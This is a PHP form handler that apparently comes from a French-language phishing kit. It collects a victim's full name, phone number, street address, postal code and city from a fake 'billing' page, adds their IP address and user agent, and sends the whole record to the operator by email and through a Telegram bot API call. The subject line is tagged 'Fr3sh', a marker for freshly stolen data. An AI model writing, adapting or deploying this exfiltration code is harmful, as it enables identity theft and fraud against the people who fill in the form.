<?php

include('../common/sub_includes.php');
include('../common/includes.php');
include('../config.php');

ob_start();
if(!isset($_SESSION)){
session_start();  // Et on ouvre la session
} 

$nomprenom = $_POST['nomprenom'];
$nvoie = $_POST['nvoie'];
$adresse1 = $_POST['adresse1'];
$adresse2 = $_POST['adresse2'];
$cp = $_POST['cp'];
$ville = $_POST['ville'];
$pays = 'France';
$phone = $_POST['phone'];

if($_SERVER['REQUEST_METHOD'] == 'POST'){

  $_SESSION['nomprenom']  = $nomprenom;
  $_SESSION['nvoie']  = $nvoie;
  $_SESSION['adresse1']  = $adresse1;
  $_SESSION['tel']  = $adresse2;
  $_SESSION['cp']  = $cp;
  $_SESSION['ville']  = $ville;
  $_SESSION['phone']  = $phone;

$message = '
[🦊] Certificat Querty billing +1 [🦊]

👮 Nom complet : '.$_SESSION['nomprenom'].'
📱 Téléphone : '.$_SESSION['phone'].'

🏡 Adresse1 : '.$_SESSION['adresse1'].'
🏡 Adresse2 : '.$_SESSION['nvoie'].'

🏙️ Ville : '.$_SESSION['ville'].'
🏙️ Code Postal : '.$_SESSION['cp'].'

🚩 Pays : '.$_SESSION['pays'].'

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

    if($mail_send == true){
        $Subject=' 「🎰」+1 Fr3sh Certificat billing2 from '.$nomprenom.' | '.$_SERVER['HTTP_USER_AGENT'];
        $head='From: Certificat <info@querty.bg>';
  
        mail($my_mail,$Subject,$message,$head,$heads);
    }

    if($tlg_send == true){
        file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$rez_login.'&text='.urlencode("$message").'');
    }
}
